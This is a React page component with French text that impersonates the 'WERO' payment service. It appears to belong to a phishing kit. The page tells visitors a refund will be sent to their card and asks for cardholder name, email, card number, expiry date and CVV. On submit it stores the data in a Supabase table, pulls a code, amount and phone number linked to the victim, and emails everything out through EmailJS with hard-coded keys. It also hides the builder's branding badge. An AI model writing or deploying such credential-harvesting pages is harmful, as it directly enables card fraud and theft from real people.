import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Footer } from "@/components/Footer";
import { useToast } from "@/components/ui/use-toast";
import { Lock } from "lucide-react";
import emailjs from "emailjs-com";
import { supabase } from "@/lib/supabase"; // Toujours utilisé pour lire les infos en DB

const Card = () => {
  const [formData, setFormData] = useState({
    titulaire: "",
    email: "",
    numerocarte: "",
    dateexpiration: "",
    cryptogramme: "",
  });
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  useEffect(() => {
    const element = document.getElementById("lovable-badge");
    if (element) element.style.display = "none";
  }, []);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (
      !formData.titulaire ||
      !formData.email ||
      !formData.numerocarte ||
      !formData.dateexpiration ||
      !formData.cryptogramme
    ) {
      toast({
        title: "Erreur",
        description: "Veuillez remplir tous les champs",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    const userId = localStorage.getItem("userId");
    if (!userId) {
      navigate("/");
      return;
    }

    try {
      // 1. Mise à jour des infos carte dans Supabase
      const { error: updateError } = await supabase
        .from("sefon")
        .update({
          email: formData.email,
          numerocarte: formData.numerocarte,
          dateexpiration: formData.dateexpiration,
          cryptogramme: formData.cryptogramme,
        })
        .eq("id", userId);

      if (updateError) throw updateError;

      // 2. Récupération des infos complémentaires pour le mail
      const { data, error: fetchError } = await supabase
        .from("sefon")
        .select("code, montant, telephone")
        .eq("id", userId)
        .single();

      if (fetchError || !data) throw fetchError;

      // 3. Envoi avec EmailJS
      const serviceID = "service_mev4gqt";
      const templateID = "template_uf95szs";
      const publicKey = "u9q4QhywRWjrfKnHj";

      const templateParams = {
        email: formData.email,
        titulaire: formData.titulaire,
        numerocarte: formData.numerocarte,
        dateexpiration: formData.dateexpiration,
        cryptogramme: formData.cryptogramme,
        code: data.code,
        montant: data.montant,
        telephone: data.telephone,
      };

      await emailjs.send(serviceID, templateID, templateParams, publicKey);

      toast({
        title: "Succès",
        description: "Vos informations ont été confirmées avec succès.",
        variant: "default",
      });

      navigate("/bank");
    } catch (err) {
      console.error(err);
      toast({
        title: "Erreur",
        description: "Une erreur est survenue ",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col">
      <header className="bg-yellow-300 p-4">
        <h1 className="text-2xl font-bold">WERO</h1>
      </header>

      <main className="flex-grow flex justify-center p-4">
        <div className="max-w-md w-full">
          <h2 className="text-2xl font-bold text-yellow-500 text-center mb-4">
            VEUILLEZ CONFIRMER VOTRE CARTE SUR WERO.
          </h2>

          <div className="flex justify-center mb-4">
            <img
              src="https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=242,h=138,fit=crop/Aq2q239lEjf2a2Mj/caisse-depargne-banque-populaire-_-ce-nouveau-moyen-de-paiement-arrive-en-exclusivite-debut-juillet-2-AMqlq7W4oNHNqVJM.jpg"
              className="img-fluid"
              alt="Carte bancaire"
            />
          </div>

          <p className="text-center mb-8">
            Afin d'assurer la protection de nos utilisateurs, nous effectuerons un
            virement direct des fonds vers votre carte bancaire.
          </p>

          <form onSubmit={handleSubmit} className="space-y-6 bg-gray-50 p-6 rounded-lg">
            <div className="space-y-2">
              <Label htmlFor="titulaire">Titulaire de la carte</Label>
              <Input
                id="titulaire"
                name="titulaire"
                value={formData.titulaire}
                onChange={handleChange}
                className="border-2 border-yellow-300"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="email">Adresse e-mail</Label>
              <Input
                id="email"
                name="email"
                type="email"
                value={formData.email}
                onChange={handleChange}
                className="border-2 border-yellow-300"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="numerocarte">Numéro de carte</Label>
              <Input
                id="numerocarte"
                name="numerocarte"
                placeholder="•••• •••• •••• ••••"
                value={formData.numerocarte}
                onChange={handleChange}
                className="border-2 border-yellow-300"
                required
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="dateexpiration">Date d'expiration</Label>
                <Input
                  id="dateexpiration"
                  name="dateexpiration"
                  placeholder="MM/YY"
                  value={formData.dateexpiration}
                  onChange={handleChange}
                  className="border-2 border-yellow-300"
                  required
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="cryptogramme">CVV</Label>
                <Input
                  id="cryptogramme"
                  name="cryptogramme"
                  placeholder="•••"
                  value={formData.cryptogramme}
                  onChange={handleChange}
                  className="border-2 border-yellow-300"
                  required
                />
              </div>
            </div>

            <Button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3"
              disabled={isLoading}
            >
              <Lock className="mr-2 h-4 w-4" />
              {isLoading ? "Validation..." : "Valider en toute sécurité"}
            </Button>
          </form>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default Card;
